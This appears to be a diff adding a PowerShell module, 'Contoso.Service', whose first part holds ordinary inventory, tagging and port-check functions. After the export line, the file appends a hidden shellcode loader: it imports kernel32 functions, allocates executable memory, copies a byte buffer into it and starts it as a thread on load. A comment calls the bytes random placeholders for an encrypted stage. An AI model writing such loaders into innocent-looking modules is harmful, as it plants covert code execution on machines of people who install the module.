@@ -1,0 +1,238 @@
+$ErrorActionPreference = "Stop"
+$ProgressPreference = 'SilentlyContinue'
+$InformationPreference = 'SilentlyContinue'
+$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
+
+$script:DefaultTimeout = 60
+$script:ModuleVersion = '4.3.2'
+
+function Get-ContosoService {
+    <#
+    .SYNOPSIS
+        Returns Contoso inventory records.
+    .DESCRIPTION
+        Returns data for the requested objects.
+    .PARAMETER Name
+        One or more object names.
+    .PARAMETER Environment
+        Target environment.
+    #>
+    [CmdletBinding()]
+    [OutputType([pscustomobject])]
+    param(
+        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
+        [string[]]$Name,
+
+        [ValidateSet('Dev', 'Test', 'Prod')]
+        [string]$Environment = 'Test'
+    )
+
+    begin {
+        $results = [System.Collections.Generic.List[object]]::new()
+    }
+
+    process {
+        foreach ($item in $Name) {
+            $results.Add([pscustomobject]@{
+                Name        = $item
+                Environment = $Environment
+                QueriedAt   = Get-Date
+            })
+        }
+    }
+
+    end {
+        $results
+    }
+}
+
+function Set-ContosoServiceTag {
+    <#
+    .SYNOPSIS
+        Applies a tag to an existing object.
+    .DESCRIPTION
+        Returns data for the requested objects.
+    .PARAMETER Name
+        Object to tag.
+    .PARAMETER Tag
+        Tag value.
+    #>
+    [CmdletBinding(SupportsShouldProcess = $true)]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Name,
+
+        [Parameter(Mandatory = $true)]
+        [string]$Tag
+    )
+
+    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
+        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
+        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
+    }
+}
+
+function Test-ContosoServiceHealth {
+    <#
+    .SYNOPSIS
+        Tests whether an object answers on its management port.
+    .DESCRIPTION
+        Returns data for the requested objects.
+    .PARAMETER Name
+        Object to probe.
+    .PARAMETER Port
+        TCP port to probe.
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Name,
+
+        [int]$Port = 5985
+    )
+
+    $client = New-Object System.Net.Sockets.TcpClient
+    try {
+        $async = $client.BeginConnect($Name, $Port, $null, $null)
+        $connected = $async.AsyncWaitHandle.WaitOne(2000)
+        return ($connected -and $client.Connected)
+    }
+    catch {
+        return $false
+    }
+    finally {
+        $client.Close()
+    }
+}
+
+function Resolve-ContosoPath {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Path
+    )
+
+    if ([string]::IsNullOrWhiteSpace($Path)) {
+        throw 'Path must not be empty.'
+    }
+    return [System.IO.Path]::GetFullPath($Path)
+}
+
+function Contoso-Cache {
+    [CmdletBinding()]
+    param([string]$Key, [object]$Value)
+
+    if (-not $script:Cache) {
+        $script:Cache = @{}
+    }
+    if ($PSBoundParameters.ContainsKey('Value')) {
+        $script:Cache[$Key] = $Value
+    }
+    return $script:Cache[$Key]
+}
+
+function Get-ContosoModuleInfo {
+    [CmdletBinding()]
+    param()
+
+    [pscustomobject]@{
+        Module      = 'Contoso.Service'
+        Version     = $script:ModuleVersion
+        Timeout     = $script:DefaultTimeout
+        Exported    = @('Get-ContosoService', 'Set-ContosoServiceTag', 'Test-ContosoServiceHealth')
+    }
+}
+
+$script:ExportedFunctions = @('Get-ContosoService', 'Set-ContosoServiceTag', 'Test-ContosoServiceHealth')
+Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)
+
+$script:ModuleRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
+Write-Verbose ('Module root: {0}' -f $script:ModuleRoot)
+
+Write-Verbose ('Loaded module {0} version {1}' -f 'Contoso.Service', $script:ModuleVersion)
+
+if ($ExecutionContext.SessionState.Module) {
+    Write-Verbose 'Module session detected.'
+}
+else {
+    Write-Verbose 'Script session detected.'
+}
+
+$script:Cache = @{}
+Write-Verbose ('Cache initialised for {0}' -f 'Contoso.Service')
+
+Export-ModuleMember -Function Get-ContosoService, Set-ContosoServiceTag, Test-ContosoServiceHealth, Get-ContosoModuleInfo
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+$NativeCode = @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class NativeApi
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+        uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+        uint dwFreeType);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+        uint dwCreationFlags, out uint lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@
+
+Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+# buffer placeholder: random bytes, replaces the encrypted stage in real samples
+$Buffer = [Byte[]] @(
+    0x50, 0xb0, 0x74, 0x63, 0xd8, 0x13, 0xf7, 0xfb, 0x08, 0x8f, 0x85, 0x67, 0x53, 0xbd, 0x2b, 0xff,
+    0x45, 0xae, 0xf3, 0x05, 0x7b, 0xcd, 0xd9, 0x9a, 0x3d, 0x38, 0x2a, 0x23, 0xbc, 0x5d, 0x2c, 0x3a,
+    0xc1, 0x89, 0x76, 0xe2, 0x47, 0x04, 0x97, 0x64, 0xd8, 0xfe, 0x5e, 0x6f, 0x08, 0xde, 0x2e, 0x89,
+    0xfa, 0x8c, 0xfa, 0x70, 0xcf, 0x17, 0x3f, 0xdf, 0xa2, 0x3d, 0xc2, 0xd5, 0x10, 0xff, 0x21, 0x75,
+    0x72, 0x61, 0x37, 0x35, 0x65, 0x5e, 0xcb, 0xc0, 0x53, 0xb9, 0x70, 0x40, 0x43, 0xb3, 0x50, 0x71,
+    0x9a, 0xec, 0xa1, 0x73, 0x62, 0xcd, 0x00, 0x70, 0x79, 0x9e, 0xa1, 0x84, 0x84, 0x38, 0xf0, 0x00,
+    0x94, 0x11, 0x36, 0xe0, 0x89, 0xf7, 0x1c, 0x06, 0x6a, 0x36, 0xf5, 0x60, 0xfb, 0x2f, 0xcf, 0x24,
+    0x61, 0x26, 0x30, 0x68, 0x89, 0xd5, 0x84, 0x32, 0xba, 0x3d, 0x68, 0x9c, 0xe2, 0x66, 0x87, 0x8b,
+    0x10, 0x88, 0x14, 0x6b, 0x13, 0xfc, 0xf9, 0x6b, 0x0d, 0xa4, 0xb7, 0x46, 0xc5, 0xb0, 0x2e, 0xab,
+    0x50, 0x48, 0x8e, 0x96, 0xc8, 0x46, 0x7c, 0x15, 0x03, 0xb4, 0x12, 0x4f, 0x1c, 0xdf, 0xdb, 0x8c,
+    0x6a, 0xf1, 0x13, 0xda, 0xf2, 0x59, 0x02, 0x1a, 0xe8, 0x75, 0xc0, 0x5c, 0x50, 0xfe, 0x85, 0xee,
+    0xc7, 0x2c, 0x21, 0x21, 0xd1, 0x4b, 0xb7, 0x3f, 0x7b, 0x79, 0x85, 0xd8, 0x03, 0xa5, 0x63, 0xbc,
+    0x1c, 0xc6, 0x93, 0xdb, 0xed, 0x3e, 0xd9, 0x45, 0x52, 0xab, 0x9c, 0xe9, 0x6a, 0xbe, 0x02, 0xdc,
+    0x8b, 0x8a, 0x7b, 0xea, 0x66, 0x3a, 0xef, 0x4f, 0xa9, 0xb6, 0x86, 0x22, 0x44, 0x4a, 0xc2, 0xc6,
+    0x28, 0x44, 0x7f, 0x22, 0xe6, 0x6c, 0xe1, 0x91, 0xa3, 0x33, 0x7e, 0x29, 0xe5, 0xed, 0x44, 0xc1,
+    0x76, 0xd2, 0x77, 0x3a, 0xe1, 0xc0, 0xe0, 0x7b, 0x86, 0xc8, 0x84, 0x7d, 0xc7, 0x37, 0x78, 0x7c,
+    0xd3, 0xa8, 0x30, 0xc5, 0x32, 0x9d, 0x78, 0xa5, 0x77, 0xba, 0xad, 0xc0, 0x70, 0x5b, 0x98, 0x19,
+    0x8f, 0xbf, 0x22, 0x24, 0xd4, 0xfd, 0x25, 0x4f, 0xa2, 0xa6, 0x68, 0xdf, 0xfe, 0x62, 0x17, 0x5e,
+    0x6a, 0x12, 0x43, 0x77, 0x09, 0xcc, 0xbe, 0xe1, 0xe5, 0xef, 0x07, 0x14, 0xa4, 0xed, 0x40, 0x3e,
+    0x3e, 0x60, 0x63, 0xbf, 0xcb, 0x5d, 0xd6, 0x30, 0x0c, 0x73, 0xef, 0xf2, 0x1a, 0x18, 0x8a, 0xc5,
+    0x7d, 0x1a, 0xbc, 0xdb, 0x73, 0x4f
+)
+
+$ProcHandle = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+if ($ProcHandle -eq [IntPtr]::Zero) {
+    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+    return
+}
+
+[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
+$ThreadId = 0
+$Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
+[void][NativeApi]::WaitForSingleObject($Thread, 2855)
+[void][NativeApi]::CloseHandle($Thread)
+
+$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
